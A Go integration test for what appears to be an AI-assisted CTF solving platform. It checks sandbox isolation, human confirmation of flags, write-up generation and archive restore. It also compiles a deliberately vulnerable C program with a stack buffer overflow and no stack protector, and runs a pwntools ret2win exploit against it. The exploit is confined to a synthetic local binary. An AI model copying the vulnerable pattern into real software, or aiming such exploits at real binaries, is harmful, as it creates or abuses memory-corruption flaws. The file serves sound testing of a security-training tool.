package ctf

import (
	"context"
	"fmt"
	"github.com/Autumn-27/artex/artifacts"
	"github.com/Autumn-27/artex/ctfrunner"
	"github.com/Autumn-27/artex/db"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// Opt-in: this test compiles and solves its own tiny binaries in the same
// resource-limited containers used by real tasks. It never uses the app host shell.
func TestPwnREExecutionEvidenceWPAndArchive(t *testing.T) {
	if os.Getenv("ARTEX_CTF_DOCKER_TEST") != "1" {
		t.Skip("set ARTEX_CTF_DOCKER_TEST=1 with a test PostgreSQL and Docker socket")
	}
	dsn := os.Getenv("ARTEX_PG_DSN")
	if dsn == "" {
		t.Fatal("test database required")
	}
	pg, err := db.Open(dsn)
	if err != nil {
		t.Fatal(err)
	}
	defer pg.Close()
	if err = pg.EnsureLLMRecordsTable(); err != nil {
		t.Fatal(err)
	}
	if err = pg.EnsureLLMUsageTable(); err != nil {
		t.Fatal(err)
	}
	task, err := pg.CreateTaskWithOptions("Synthetic local ret2win and reverse checker", "recover synthetic flag", db.TaskCreateOptions{Mode: "ctf", ChallengeType: "pwn"})
	if err != nil {
		t.Fatal(err)
	}
	defer pg.DeleteTask(task.ID)
	root := t.TempDir()
	runner := &ctfrunner.Client{URL: os.Getenv("ARTEX_CTF_TEST_RUNNER_URL"), Token: os.Getenv("ARTEX_CTF_TEST_RUNNER_TOKEN")}
	var engine *ctfrunner.Engine
	if runner.URL == "" {
		engine = ctfrunner.DockerEngine("/var/run/docker.sock", "autumn27/artex-ctf-tools:20261109")
		controller := &ctfrunner.Server{Engine: engine, Token: strings.Repeat("test-", 8), StateDir: t.TempDir()}
		httpServer := httptest.NewServer(controller.Handler())
		defer httpServer.Close()
		runner = &ctfrunner.Client{URL: httpServer.URL, Token: controller.Token}
	}
	s := &Service{Root: root, DB: pg, Runner: runner}
	store := artifacts.Store{Root: root}
	source := `#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
void win(void){ puts("flag{artex_synthetic_ret2win}"); fflush(stdout); _exit(0); }
void vuln(void){ char b[32]; read(0,b,256); }
int check(unsigned char x){ return (x ^ 0x55) == 0x12; }
int main(void){ vuln(); return 0; }
`
	a, err := store.Add("task", fmt.Sprint(task.ID), "challenge.c", "source", strings.NewReader(source))
	if err != nil {
		t.Fatal(err)
	}
	m, _ := store.Inputs(task.ID, 101)
	spec := ctfrunner.SessionSpec{TaskID: task.ID, IntentID: 101, InputHash: Hash(m)}
	if engine != nil {
		defer engine.Remove(context.Background(), "artex-ctf-"+spec.Key())
	} else {
		t.Logf("external runner session: artex-ctf-%s", spec.Key())
	}
	exec := func(command string, timeout int) *db.CTFExecution {
		t.Helper()
		e, err := s.Execute(t.Context(), task.ID, 101, command, timeout)
		if err != nil {
			t.Fatal(err)
		}
		if e.Error != "" || e.ExitCode != 0 {
			t.Fatalf("command failed: %s\n%s\n%s\n%s", command, e.Error, e.StdoutExcerpt, e.StderrExcerpt)
		}
		return e
	}
	exec("gcc -g -O0 -fno-stack-protector -no-pie -o challenge -x c "+s.LogicalPath(a), 60)
	exec("file challenge; /usr/bin/checksec --file=challenge", 60)
	e := exec("printf 'break vuln\\nrun < /dev/null\\ninfo registers rip rsp\\nbt\\n' > debug.gdb; gdb -q -nx -batch -x debug.gdb -- ./challenge", 60)
	if !strings.Contains(e.StdoutExcerpt, "Breakpoint 1") {
		t.Fatal("GDB did not hit actual breakpoint")
	}
	decompiled := exec("mkdir -p /tmp/ghidra; analyzeHeadless /tmp/ghidra wp -import /work/challenge -overwrite -scriptPath /opt/ctf/scripts -postScript ExportFunctions.java check 1 -deleteProject", 300)
	if !strings.Contains(decompiled.StdoutExcerpt+decompiled.StderrExcerpt, "=== check") {
		t.Fatal("Ghidra did not decompile checker")
	}
	exec("ctf-python-re -c 'from angr import claripy; x=claripy.BVS(\"x\",8); s=claripy.Solver(); s.add(x ^ 0x55 == 0x12); print(s.eval(x,1))'", 60)
	exec("test ! -e /var/run/docker.sock; test ! -e /app/config.json; test -z \"${ARTEX_PG_DSN:-}\"; test ! -w /usr/bin; test ! -w "+s.LogicalPath(a), 30)
	solver := `from pwn import *
context.binary = elf = ELF('./challenge', checksec=False)
rop = ROP(elf)
p = process('./challenge')
p.send(b'A'*40 + p64(rop.find_gadget(['ret']).address) + p64(elf.symbols['win']))
print(p.recvall(timeout=3).decode())
`
	if err = os.WriteFile(filepath.Join(s.WorkDir(task.ID, 101), "solve.py"), []byte(solver), 0600); err != nil {
		t.Fatal(err)
	}
	solved := exec("python solve.py", 60)
	if !strings.Contains(solved.StdoutExcerpt, "flag{artex_synthetic_ret2win}") {
		t.Fatal("pwntools did not solve sample")
	}
	if _, err = s.Execute(t.Context(), task.ID, 101, "echo should-wait-for-submission", 10); err == nil {
		t.Fatal("candidate did not stop further probing")
	}
	candidates, err := pg.CTFCandidates(t.Context(), task.ID)
	if err != nil || len(candidates) != 1 || candidates[0].State != "candidate" {
		t.Fatalf("candidates: %+v %v", candidates, err)
	}
	partial, err := s.GenerateWP(t.Context(), task.ID)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(partial.Markdown, "阶段报告") || !strings.Contains(partial.Markdown, solver) || !strings.Contains(partial.Markdown, solved.ID) {
		t.Fatal("WP omitted real script or partial state")
	}
	if _, err = s.Submit(t.Context(), task.ID, solved.ID, "flag{invented}"); err == nil {
		t.Fatal("accepted invented answer")
	}
	c := candidates[0]
	accepted, err := pg.DecideCTFCandidate(t.Context(), task.ID, c.ID, c.Revision, "accepted", "Synthetic solver reproduced in test")
	if err != nil {
		t.Fatal(err)
	}
	if _, err = pg.DecideCTFCandidate(t.Context(), task.ID, c.ID, c.Revision, "rejected", ""); err == nil {
		t.Fatal("accepted stale revision")
	}
	final, err := s.GenerateWP(t.Context(), task.ID)
	if err != nil {
		t.Fatal(err)
	}
	if final.Revision == partial.Revision || !strings.Contains(final.Markdown, "答案已由用户确认") {
		t.Fatal("confirmation not reflected in WP")
	}
	cached, err := s.GenerateWP(t.Context(), task.ID)
	if err != nil || cached.Revision != final.Revision || cached.GeneratedAt != final.GeneratedAt {
		t.Fatal("unchanged WP created a new revision")
	}
	// Archive rows and evidence files are retained by the existing task package.
	if err = pg.SetPaused(task.ID, true); err != nil {
		t.Fatal(err)
	}
	arc, err := pg.QueueTaskArchive(task.ID)
	if err != nil {
		t.Fatal(err)
	}
	defer pg.Exec(`DELETE FROM task_archives WHERE task_id=$1`, task.ID)
	if _, err = pg.ClaimTaskArchiveJob(t.Context()); err != nil {
		t.Fatal(err)
	}
	snapshot, err := pg.SnapshotTaskArchive(task.ID)
	if err != nil {
		t.Fatal(err)
	}
	if err = pg.CompleteTaskArchive(arc.ID, snapshot, "/tmp/test.tar.zst", "test", 1, 1); err != nil {
		t.Fatal(err)
	}
	if _, err = pg.QueueTaskArchiveRestore(arc.ID); err != nil {
		t.Fatal(err)
	}
	if _, err = pg.ClaimTaskArchiveJob(t.Context()); err != nil {
		t.Fatal(err)
	}
	if _, err = pg.RestoreTaskArchive(arc.ID, snapshot, 0); err != nil {
		t.Fatal(err)
	}
	if err = pg.CompleteTaskArchiveRestore(arc.ID); err != nil {
		t.Fatal(err)
	}
	restored, err := pg.CTFCandidates(t.Context(), task.ID)
	if err != nil || len(restored) != 1 || restored[0].State != "accepted" {
		t.Fatalf("archive lost candidate: %+v %v", restored, err)
	}
	if _, err = store.Add("task", fmt.Sprint(task.ID), "new.txt", "attachment", strings.NewReader("new input")); err != nil {
		t.Fatal(err)
	}
	if err = s.Sync(t.Context(), task.ID); err != nil {
		t.Fatal(err)
	}
	if _, err = pg.DecideCTFCandidate(t.Context(), task.ID, c.ID, accepted.Revision, "accepted", ""); err == nil {
		t.Fatal("old input candidate reaccepted")
	}
	// A timeout must kill processes, then the persisted workspace can be resumed.
	timed, err := s.Execute(t.Context(), task.ID, 101, "sleep 30", 1)
	if err != nil || timed.Error == "" {
		t.Fatalf("timeout not recorded: %+v %v", timed, err)
	}
	exec("test -f solve.py; test -f challenge", 30)
}
